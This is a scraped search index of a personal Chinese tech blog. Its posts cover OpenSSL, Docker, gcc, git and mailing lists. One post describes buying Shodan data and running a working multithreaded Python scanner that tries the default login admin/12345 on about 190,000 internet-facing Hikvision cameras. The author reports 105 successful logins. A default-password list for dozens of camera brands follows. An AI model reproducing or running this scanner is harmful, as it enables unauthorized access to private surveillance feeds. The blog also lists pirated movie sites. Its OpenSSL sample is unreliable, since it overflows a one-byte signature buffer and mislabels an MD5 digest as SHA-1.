","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:2:1","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"安装perl环境，这里使用的是ActivePerl https://www.activestate.com/products/perl/ ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:2:2","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"安装NASM汇编器 https://www.nasm.us/ ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:2:3","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"配置环境变量 将刚刚安装的nasm和perl的bin目录加入PATH ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:2:4","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"编译 openssl 静态链接库 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:3:0","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"初始化环境 使用visual studio自带的命令提示工具初始化环境，因为需要使用nmake ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:3:1","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"生成编译配置文件 cd进入openssl源码目录 执行 perl Configure VC-WIN64A no-asm no-shared --prefix=\"D:\\Project\\opensslwork\\openssl\\build\" --openssldir=\"D:\\Project\\opensslwork\\openssl\\build\\ssl\" ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:3:2","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"进行编译并测试和安装 nmake nmake test nmake install 此时已经有了我们需要的头文件和静态链接lib库 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:3:3","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"使用openssl的api进行编程 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:4:0","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"visual studio项目配置 vs创建空项目，然后配置头文件和库文件的路径 项目右键-属性，配置选择所有配置，平台选择x64 VC++ 目录 配置里面的 包含目录 添加openssl的头文件目录, 我这里是 D:\\Project\\opensslwork\\openssl\\build\\include; 链接器 里面的 输入 的 附加依赖项 添加 静态库名，libcrypto.lib;libssl.lib; 注意：在使用openssl的静态链接库时，除了添加 libcrypto.lib;libssl.lib;，还需要添加系统的依赖库：crypt32.lib;WS2_32.lib;， 因为openssl在windows平台使用了这些库。 完整的： kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies);crypt32.lib;libcrypto.lib;libssl.lib;WS2_32.lib; ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:4:1","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"添加头文件 因为需要md5,rsa,base64等操作，这里需要导入openssl四个相关的头文件 #include \u003copenssl/rsa.h\u003e#include \u003copenssl/pem.h\u003e#include \u003copenssl/md5.h\u003e#include \u003copenssl/bio.h\u003e ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:4:2","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"使用MD5对字符串生成摘要 int md5_hash(const char *in, unsigned char *md) { unsigned char* data; const unsigned char* str; data = (unsigned char*)in; MD5(data, strlen(in), md); //调用openssl的md5方法 return 1; } ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:4:3","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"生成rsa密钥对并以pem格式写入文件 RSA * gen_rsa() { int bits = 1024; RSA* rsa = RSA_new(); BIGNUM* e = BN_new(); BN_set_word(e, RSA_F4); int rc = RSA_generate_key_ex(rsa, bits, e, NULL); //openssl中生成rsa key的新方法 BN_free(e); if (rc != 1) return NULL; size_t pri_len; size_t pub_len; char* pri_key = NULL; char* pub_key = NULL; BIO* pubkey = BIO_new_file(\"public.pem\", \"w\"); BIO* prikey = BIO_new_file(\"private.pem\", \"w\"); PEM_write_bio_RSAPrivateKey(prikey, rsa, NULL, NULL, 0, NULL, NULL); //私钥写入文件 PEM_write_bio_RSAPublicKey(pubkey, rsa); //公钥写入文件 return rsa; } ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:4:4","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"对数据进行base64编码，base64在BIO中有 int base64_encode(const unsigned char* buffer, size_t length, char** b64text) { BIO* bio, * b64; BUF_MEM* bufferPtr; b64 = BIO_new(BIO_f_base64()); bio = BIO_new(BIO_s_mem()); bio = BIO_push(b64, bio); BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL); BIO_write(bio, buffer, length); BIO_flush(bio); BIO_get_mem_ptr(bio, \u0026bufferPtr); BIO_set_close(bio, BIO_NOCLOSE); *b64text = (char*)malloc((bufferPtr-\u003elength + 1) * sizeof(char)); memcpy(*b64text, bufferPtr-\u003edata, bufferPtr-\u003elength); (*b64text)[bufferPtr-\u003elength] = '\\0'; BIO_free_all(bio); return 0; } ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:4:5","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"最后通过main函数读入字符串并将三个过程连起来 int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"usage: work.exe \\\"string to hash and sign\\\"\"); return 0; } char* str = argv[1]; printf(\"your str: %s\\n\", str); // first md5(str) unsigned char md[MD5_DIGEST_LENGTH]; md5_hash(str, md); // then gen rsa pkey and sign the md RSA* rsa = gen_rsa(); unsigned char* sig = new unsigned char; unsigned int siglen; RSA_sign(NID_sha1, md, MD5_DIGEST_LENGTH, sig, \u0026siglen, rsa); // final base64(sig) char* b64text; base64_encode(sig, (size_t)siglen, \u0026b64text); printf(\"%s\\n\", b64text); return 0; } 因为是课程作业，就没有对出现的错误情况进行处理，实际使用时需要考虑到 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:4:6","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"运行 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:5:0","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"运行截图 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:5:1","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"生成的私钥文件 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:5:2","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":["coding"],"content":"生成的公钥文件 ","date":"2020-03-18","objectID":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/:5:3","tags":["openssl","coding"],"title":"静态链接OpenSSL进行RSA\\MD5\\Base64","uri":"https://lgf.im/posts/coding/openssl-first-try-rsa-md5-base64/"},{"categories":null,"content":" 打赏与捐赠只是一种形式，任何有意义的信息、评论、邮件或反馈我很乐于收到 ","date":"2020-03-17","objectID":"https://lgf.im/donate/:0:0","tags":null,"title":"Donate","uri":"https://lgf.im/donate/"},{"categories":null,"content":"你可以通过以下渠道进行打赏或捐赠 ","date":"2020-03-17","objectID":"https://lgf.im/donate/:1:0","tags":null,"title":"Donate","uri":"https://lgf.im/donate/"},{"categories":null,"content":"支付宝 ","date":"2020-03-17","objectID":"https://lgf.im/donate/:1:1","tags":null,"title":"Donate","uri":"https://lgf.im/donate/"},{"categories":null,"content":"微信 感谢各位进行捐赠的朋友 ","date":"2020-03-17","objectID":"https://lgf.im/donate/:1:2","tags":null,"title":"Donate","uri":"https://lgf.im/donate/"},{"categories":null,"content":"About Me Hi, I’m zu1k. I’m a student, now busy with the postgraduate entrance examination. I was born and live in a small village surrounded by sea. I dreame of traveling around the world. As for programming, I have learned java、python、golang and some javascript, I like to write backend in golang and frontend in vue. ","date":"2020-03-17","objectID":"https://lgf.im/about/:1:0","tags":null,"title":"关于","uri":"https://lgf.im/about/"},{"categories":null,"content":"Programming Golang: gin\\gorm Java: SpringBoot\\Spring Security Python: Flask Javascript / Html / Css / Vue.js ","date":"2020-03-17","objectID":"https://lgf.im/about/:1:1","tags":null,"title":"关于","uri":"https://lgf.im/about/"},{"categories":null,"content":"Security Web Burp Suite \\ Xray \\ HackerBar Reverse IDA \\ JEB \\ Ghidra \\ GDB PWN Pwntools (python) ","date":"2020-03-17","objectID":"https://lgf.im/about/:1:2","tags":null,"title":"关于","uri":"https://lgf.im/about/"},{"categories":null,"content":"About this blog This blog is used to record my study, thinking and life. You can find articles by categories and tags, searching is also a good choice. You can subscribe my blog by RSS or by Email You can click here to reward or donate to me. ","date":"2020-03-17","objectID":"https://lgf.im/about/:2:0","tags":null,"title":"关于","uri":"https://lgf.im/about/"},{"categories":["docker"],"content":"为docker设置代理 环境是在centos下，如果没有新建下面这个文件夹 sudo mkdir -p /etc/systemd/system/docker.service.d 之后新建下面这个文件走http代理 sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf 填入 [Service] Environment=\"HTTP_PROXY=http://192.168.88.10:7890/\" 编辑下面这个文件走https代理 vim /etc/systemd/system/docker.service.d/https-proxy.conf 修改为 [Service] Environment=\"HTTPS_PROXY=https://proxy.example.com:443/\" 之后你使用docker pull的时候就可以pull gcr.io上的镜像了 https://juejin.im/post/5cc7b53c51882525124126f1 https://docs.docker.com/config/daemon/systemd ","date":"2020-03-08","objectID":"https://lgf.im/posts/coding/speedup-docker-pull/:1:0","tags":["docker","proxy"],"title":"加速docker pull","uri":"https://lgf.im/posts/coding/speedup-docker-pull/"},{"categories":["docker"],"content":"换国内源 创建或修改 /etc/docker/daemon.json sudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u003c\u003c-'EOF' { \"registry-mirrors\": [ \"https://u8rbddql.mirror.aliyuncs.com\", \"https://docker.mirrors.ustc.edu.cn\", \"https://mirror.ccs.tencentyun.com\", \"https://registry.docker-cn.com\" ] } EOF sudo systemctl daemon-reload sudo systemctl restart docker https://juejin.im/post/5cd2cf01f265da0374189441 ","date":"2020-03-08","objectID":"https://lgf.im/posts/coding/speedup-docker-pull/:2:0","tags":["docker","proxy"],"title":"加速docker pull","uri":"https://lgf.im/posts/coding/speedup-docker-pull/"},{"categories":["coding"],"content":" 一直用gcc编译各种东西，第一次研究如何编译gcc 这就是一个鸡生蛋与蛋生鸡的问题 ","date":"2019-12-28","objectID":"https://lgf.im/posts/linux/gcc-compile/:0:0","tags":["gcc","compile"],"title":"编译gcc","uri":"https://lgf.im/posts/linux/gcc-compile/"},{"categories":["coding"],"content":"依赖 编译gcc需要gmp、mpfr和mpc，还需要预先有一个已经能用的gcc ","date":"2019-12-28","objectID":"https://lgf.im/posts/linux/gcc-compile/:1:0","tags":["gcc","compile"],"title":"编译gcc","uri":"https://lgf.im/posts/linux/gcc-compile/"},{"categories":["coding"],"content":"首先安装gmp 从 http://ftp.gnu.org/gnu/gmp/ 下载一个符合要求的稳定版本的gmp的源码 这里我下载的是 http://ftp.gnu.org/gnu/gmp/gmp-5.0.1.tar.bz2 解压后从源码编译安装 tar jxf gmp-5.0.1.tar.bz2 cd gmp-5.0.1 sudo ./configure --prefix=/opt/gmp sudo make sudo make install ","date":"2019-12-28","objectID":"https://lgf.im/posts/linux/gcc-compile/:1:1","tags":["gcc","compile"],"title":"编译gcc","uri":"https://lgf.im/posts/linux/gcc-compile/"},{"categories":["coding"],"content":"安装mpfr 从 http://ftp.gnu.org/gnu/mpfr/ 下载一个稳定版本 我选择的是 http://ftp.gnu.org/gnu/mpfr/mpfr-3.1.4.tar.bz2 tar jxf mpfr-3.1.4.tar.bz2 cd mpfr-3.1.4 sudo ./configure --prefix=/opt/mpfr \\ --with-gmp-lib=/opt/gmp/lib \\ --with-gmp-include=/opt/gmp/include sudo make sudo make install ","date":"2019-12-28","objectID":"https://lgf.im/posts/linux/gcc-compile/:1:2","tags":["gcc","compile"],"title":"编译gcc","uri":"https://lgf.im/posts/linux/gcc-compile/"},{"categories":["coding"],"content":"安装mpc 从 http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz 下载 我选择的是http://ftp.gnu.org/gnu/mpc/mpc-1.0.3.tar.gz tar zxf mpc-1.0.3.tar.gz cd mpc-1.0.3 sudo ./configure --prefix=/opt/mpc \\ --with-gmp-lib=/opt/gmp/lib \\ --with-gmp-include=/opt/gmp/include \\ --with-mpfr-lib=/opt/mpfr/lib \\ --with-mpfr-include=/opt/mpfr/include sudo make sudo make install 上面依赖安装顺序不能错 后来听曹老师说可以用 apt 直接安装，血亏 sudo apt install libmpc-dev libmpfr-dev libgmp-dev libgmp3-dev 又一个后来，发现 gcc 源码中有脚本可以一键下载安装这些依赖 sh ./contrib/download_prerequisites ","date":"2019-12-28","objectID":"https://lgf.im/posts/linux/gcc-compile/:1:3","tags":["gcc","compile"],"title":"编译gcc","uri":"https://lgf.im/posts/linux/gcc-compile/"},{"categories":["coding"],"content":"编译 然后进入gcc目录 配置编译配置 ./configure \\ --enable-checking=release \\ --enable-languages=c,c++ \\ --disable-multilib 执行 make -j8 然后去喝功夫茶 ","date":"2019-12-28","objectID":"https://lgf.im/posts/linux/gcc-compile/:2:0","tags":["gcc","compile"],"title":"编译gcc","uri":"https://lgf.im/posts/linux/gcc-compile/"},{"categories":["share"],"content":"奈菲影视 https://www.nfmovies.com/ ","date":"2019-12-18","objectID":"https://lgf.im/posts/share/pirated-movie/:0:1","tags":["movie","pirated"],"title":"盗版影视站","uri":"https://lgf.im/posts/share/pirated-movie/"},{"categories":["share"],"content":"团长资源 https://tzfile.com/ ","date":"2019-12-18","objectID":"https://lgf.im/posts/share/pirated-movie/:0:2","tags":["movie","pirated"],"title":"盗版影视站","uri":"https://lgf.im/posts/share/pirated-movie/"},{"categories":["share"],"content":"低端影视 http://ddrk.me/ ","date":"2019-12-18","objectID":"https://lgf.im/posts/share/pirated-movie/:0:3","tags":["movie","pirated"],"title":"盗版影视站","uri":"https://lgf.im/posts/share/pirated-movie/"},{"categories":["share"],"content":"人人影视 http://www.zmz2019.com/ ","date":"2019-12-18","objectID":"https://lgf.im/posts/share/pirated-movie/:0:4","tags":["movie","pirated"],"title":"盗版影视站","uri":"https://lgf.im/posts/share/pirated-movie/"},{"categories":["share"],"content":"远鉴字幕组 https://yj.apkgm.top/ ","date":"2019-12-18","objectID":"https://lgf.im/posts/share/pirated-movie/:0:5","tags":["movie","pirated"],"title":"盗版影视站","uri":"https://lgf.im/posts/share/pirated-movie/"},{"categories":["share"],"content":"tg帮找资源频道 https://t.me/s/lovesource https://www.netflixstar.top/ https://1090ys.com/ ","date":"2019-12-18","objectID":"https://lgf.im/posts/share/pirated-movie/:0:6","tags":["movie","pirated"],"title":"盗版影视站","uri":"https://lgf.im/posts/share/pirated-movie/"},{"categories":null,"content":"去年的某个周末，我偶然在腾讯视频看到了一部连续短剧《东方华尔街》，刚看第一集就被深深吸引住了。《东方华尔街》讲述的是一队隐于世的金融雇佣兵，狙击政经界传奇人物，并搅动整个金融市场的复仇故事。故事吸引我的不仅仅是故事中的师徒情谊、恩怨之争、社会责任，更有整个连续短剧中贯穿的金融内容。这队人通过金融、传媒、政治等各方面手段操纵整个金融市场，继而决定整个金融社会的走势，这让我对金融相关知识愈发感兴趣起来。 在看完这个连续短剧之后，我又去学校图书馆查找相关书籍，书架上书太多了，太专业的看不懂，自己还是对金融相关发展历史和故事比较感兴趣，所以最终决定看《货币战争》。 后续因为期末考试书没有看完，这段故事就告一段落。 这段时间，正在kindle上阅读刚下载的几本书《坏血：一个硅谷巨头的秘密与谎言》、《金钱永不眠：资本世界的暗流涌动和金融逻辑》，书还没看完，但却勾起了我对金融学、经济学等相关知识更加深入了解的念头。 这段时间是期末考试月，越到考试月，这个人在无聊的情况下想的事情越多，加上今年发生的种种事情、各种乱七八糟颠覆我世界观的新闻，我对一些事物的概念越发模糊起来。 什么是国家？ 什么是政治？ 什么是社会？ 什么是经济？ 什么是金融？ 什么是资本？ 等等。。。。。 这些概念最初接触应该是初高中的政治课上，但是学习的也不够深入，或者说学的东西太模糊了，感觉跟现实世界的一些东西有些偏差，在生活中越发发现有些东西是需要自己去体悟自己去领会的。 一个人的世界观、金钱观、人生观、、、等等各种观，我们从小接受的教育，都是正确的吗？或者说没有什么正确的东西，只有适合这个时代、适合这个社会、适合当前的一些东西。 自己出生于农村家庭，也没有去过国外，就连出省也仅有两次，对这个世界的认识还是太浅了。在网络上看到一些事情，在一些平台上看到国外从未了解过的国家的一些事情，发现自己从小到大所受的教育有很多东西已经不适合这个时代了，也不能说过时，感觉上就是太理想化了，或者说之前想的太简单了，很多事情不能说“不是这样”，而是“并不仅仅是我想的这样”。 好啦，不说了，貌似跑题了，也没关系啦，拜拜，读到这里的陌生人。 挖坑 假期要看的连续剧 《富翁》、《亿万》 电影 《华尔街》 《华尔街2：金钱永不眠》 迁移丢失的评论： Scarlett 2020年3月1日 上午1:06 货币战争并不建议阅读，一个小技巧是阅读前先看豆瓣的评分书评。另外推荐书《灭火》《聪明的投资者》《随机漫步的傻瓜》《投资学精要》《金融学》《漫步华尔街》《伟大的博弈》《战胜华尔街》《逆向思考的艺术》《格雷厄姆投资指南》《投资最重要的事》 ","date":"2019-12-16","objectID":"https://lgf.im/posts/thinking/thinking-12-16/:0:0","tags":["thinking"],"title":"资本、金融、经济","uri":"https://lgf.im/posts/thinking/thinking-12-16/"},{"categories":["coding"],"content":"git reflog git reflog 可以查看所有分支的所有操作记录（包括（包括commit和reset的操作），包括已经被删除的commit记录，git log则不能察看已经删除了的commit记录，而且跟进结果可以回退道某一个修改 有时候想要删除reflog记录，可以使用下面的命令 首先确保所有分支都没有引用该提交，包括HEAD也不指向这个提交。 然后 git reflog expire –expire=now –all (这会清除分支变更历史) 然后 git gc –prune=now (不用调整时间，加上–prune=now命令即可) ","date":"2019-12-01","objectID":"https://lgf.im/posts/learn/some-git-skills/:0:1","tags":["git"],"title":"一些我刚学到的GIT技巧","uri":"https://lgf.im/posts/learn/some-git-skills/"},{"categories":["coding"],"content":"git rebase 参考文章：http://jartto.wang/2018/12/11/git-rebase/ 可以合并多次提交记录: git rebase -i HEAD~4 可以合并分支而不产生merge记录 ","date":"2019-12-01","objectID":"https://lgf.im/posts/learn/some-git-skills/:0:2","tags":["git"],"title":"一些我刚学到的GIT技巧","uri":"https://lgf.im/posts/learn/some-git-skills/"},{"categories":["coding"],"content":"前言 在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制web，能够随意查看学校的监控。 海康威视web界面的弱密码是 admin 12345 时隔四年，想要再次对网络上能够访问到的海康威视web管理进行一次批量弱密码扫描 ","date":"2019-11-28","objectID":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/:1:0","tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/"},{"categories":["coding"],"content":"从shodan获取数据 首先需要搞到全网所有能够访问到的海康威视机器的IP，这是个工作量极大的任务，如果自己进行全网服务扫描的话无论是时间周期还是耗费资金都是我无法承受的 之前了解过shodan，shodan被称为“最恐怖的搜索引擎”，能够提供多年来其扫描到的全网提供的服务，可惜数据的价格极高 今年黑五是shodan诞生第十年，shodan给出极大的优惠，正式会员+20credit只需要1刀，手头有信用卡和企业邮箱的我二话不说先上了20个账号 有了shodan的credit就可以购买它的数据了。海康威视的web管理界面的关键词很简单，只需要在shodan搜索“hikvision” 在我写这篇博客的时候搜索到的数据有18万条，前段时间我下载数据的时候是19万条。 下载大量数据是需要花credit的，1credit可以下载1万条数据，所以19万多的数据花费了我20credit，正常情况下20credit是49刀，这次黑五真是太实惠了 ","date":"2019-11-28","objectID":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/:2:0","tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/"},{"categories":["coding"],"content":"提取有用信息 有了数据之后通过python解析，检查是否存在http服务，如果存在就提取ip和port #!/usr/bin/env python #-*-coding:utf-8-*- import json fi = open(\"shodan_data.json\") fo = open(\"ip.txt\", 'w') line = fi.readline() numall = 1 num = 0 while line: line = fi.readline() numall = numall+1 try: a = json.loads(line) if 'http' in a: num = num+1 txt = a['http']['host']+':'+str(a['port'])+'\\n' fo.write(txt) print(txt) except Exception as e: continue fo.close() fi.close() print(numall) print(num) ","date":"2019-11-28","objectID":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/:3:0","tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/"},{"categories":["coding"],"content":"分析与扫描 然后通过多线程python脚本进行弱密码批量扫描。 通过手工尝试找到一台可以弱密码登录进去的机器，通过burp抓包分析，找到用来验证弱密码的接口。 分析发现登录使用的是base auth，这就简单了。使用的接口是userCheck，如果登录成功应该返回200. #!/usr/bin/env python #-*-coding:utf-8-*- #批量筛选海康威视摄像头的弱密码 import threading import requests import queue import sys import re def Threads(): threadlist=[] myqueue=queue.Queue() for ip in open('ip.txt','r'): #扫描出的ip myqueue.put(ip.replace('\\n','')) for x in range(0,100): #线程数 th=threading.Thread(target=scan_Hikvision,args=(myqueue,)) threadlist.append(th) for t in threadlist: t.start() for t in threadlist: t.join() def scan_Hikvision(myqueue): while not myqueue.empty(): ip=myqueue.get() try: print(\"[*]scan:\"+ip) r = requests.get(url=(\"http://%s/PSIA/Custom/HIK/userCheck\" % ip),auth=('admin','12345'),timeout=10) status = re.findall(r'\u003cstatusValue\u003e(.*)\u003c/statusValue\u003e', r.text) if status[0] == '200': print('[√] Host http://'+ ip +' Login Success!\\n') f = open('ok.txt', 'a+') f.write(ip+\"\\n\") f.close() break except: continue if __name__=='__main__': Threads() 正好有个美国的vps，就扔到这个服务器上进行扫描，本机也开起来扫 100线程很快就扫描完毕了，国内外扫描完的结果去重后一共留下105个可登录弱密码。感觉不应该只有这么点，登录后查看只发现一个版本的海康威视，可能是检测弱密码的接口在其他版本中不存在，或者其他版本默认密码更换或者其他原因 ","date":"2019-11-28","objectID":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/:4:0","tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/"},{"categories":["coding"],"content":"后话 海康威视应该是采取了手段来避免弱密码的再次产生，但是之前老版本的DVR还有一部分并没有进行更新，大部分是农村的家庭或工厂监控，大家也都不太懂，并没有修改默认密码 心里不是滋味，身边也有一些父母的朋友他们让我帮忙安装一些路由器、监控等设备，他们的文化水平不高，当我要给他们修改密码的时候，一部分会选择手机号码，也有一部分让我不要修改密码，说改了别记不住，直接出厂密码就行了，忘了可以看一下说明书 能不能想出一种办法，既考虑到安全性，又能顾虑到这部分人的需求，这是个问题 ","date":"2019-11-28","objectID":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/:5:0","tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/"},{"categories":["coding"],"content":"弱密码收集 1.海康威视IP网络摄像机： 用户：admin，密码：12345 zoomeye搜索关键词：hikvision 2.大华网络摄像机： user:admin pass:admin 管理权限 user:default pass:user 用户默认登陆帐号 user:888888 pass:admin user:666666 pass:user zoomeye搜索关键词：WEB SERVICE 3.cctv摄像机： user：admin pass：空 telnet登陆 user：root pass：”juantech” zoomeye搜索关键词：JAWS/1.0 4.SQ-WEBCAM摄像机： user：admin pass：admin zoomeye搜索关键词：SQ-WEBCAM ACTi: admin/123456 or Admin/123456 American Dynamics: admin/admin or admin/9999 Arecont Vision: none Avigilon: admin/admin Axis: traditionally root/pass, new Axis cameras require password creation during first login Basler: admin/admin Bosch: none Brickcom: admin/admin Canon: root/camera Cisco: No default password, requires creation during first login Dahua: admin/admin Digital Watchdog: admin/admin DRS: admin/1234 DVTel: Admin/1234 DynaColor: Admin/1234 FLIR: admin/fliradmin Foscam: admin/ GeoVision: admin/admin Grandstream: admin/admin Hikvision: admin/12345 Honeywell: admin/1234 IQinVision: root/system IPX-DDK: root/admin or root/Admin\\ JVC: admin/jvc March: Networks: admin/ Mobotix: admin/meinsm Panasonic: admin/12345 Pelco Sarix: admin/admin Pixord: admin/admin Samsung Electronics: root/root or admin/4321 Samsung Techwin (old): admin/1111111 Samsung (new): admin/4321 Sanyo: admin/admin Scallop: admin/password Sentry360 (mini): admin/1234 Sentry360 (pro): none Sony: admin/admin Speco: admin/1234 Stardot: admin/admin Starvedia: admin/ Trendnet: admin/admin Toshiba: root/ikwd VideoIQ: supervisor/supervisor Vivotek: root/ Ubiquiti: ubnt/ubnt Wodsee: admin/ ","date":"2019-11-28","objectID":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/:6:0","tags":["scan","web"],"title":"针对海康威视网络摄像头弱密码的一次扫描","uri":"https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/"},{"categories":["learn"],"content":" 之前经常听说或者在新闻里见到邮件列表这个词，知道很多大佬，特别是计算机大佬、某某编程语言之父、某某操作系统之父等一堆大佬都在用邮件列表，就感到十分好奇。近期我特意上网搜索相关资料，亲身实践邮件列表的使用 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:0:0","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"什么是邮件列表 邮件列表（Mailing List）的起源可以追溯到1975年，是互联网上最早的社区形式之一，也是Internet上的一种重要工具，用于各种群体之间的信息交流和信息发布 邮件列表根据不同作用分为不同形式，其实我们生活中也有接触和使用过邮件列表这个东东，只是自己不知道这个东西就要邮件列表而已 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:1:0","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"常见的邮件列表有六种形式 电子刊物 新闻邮件 注册会员通讯 新产品通知 顾客服务/顾客关系邮件 顾客定制信息 ","date":"2019-11-27","objectID":"https://lgf.im/posts/learn/maillist/:1:1","tags":["maillist","mail"],"title":"了解邮件列表","uri":"https://lgf.im/posts/learn/maillist/"},{"categories":["learn"],"content":"根据不同的邮件分发方式，邮件列表可以分为两大类 公告型(Announcement list) 讨论型(Discussion list) 公告型 顾名思义就是类似于公告板，管理员可以给邮件列表所有成员发送公告邮件，比如我们常见的 广告邮件、新闻邮件、通知邮件等 讨论型 通俗点讲，就是一堆人加入一个列表中，这个列表有一个公用的邮箱地址，你可以给这个邮箱地址发邮件，他会自动将邮件转发给列表中的每一个人，列表中的成员可以直接通过回复邮件参与讨论，讨论内容同样会被转发给每一个人 公告型邮件列表我们在生活中经常用，不需要多说，这篇文章我们主要来实践 讨论型 邮件列表的使用 下面提到的邮件列表一词特指讨论型邮件列表 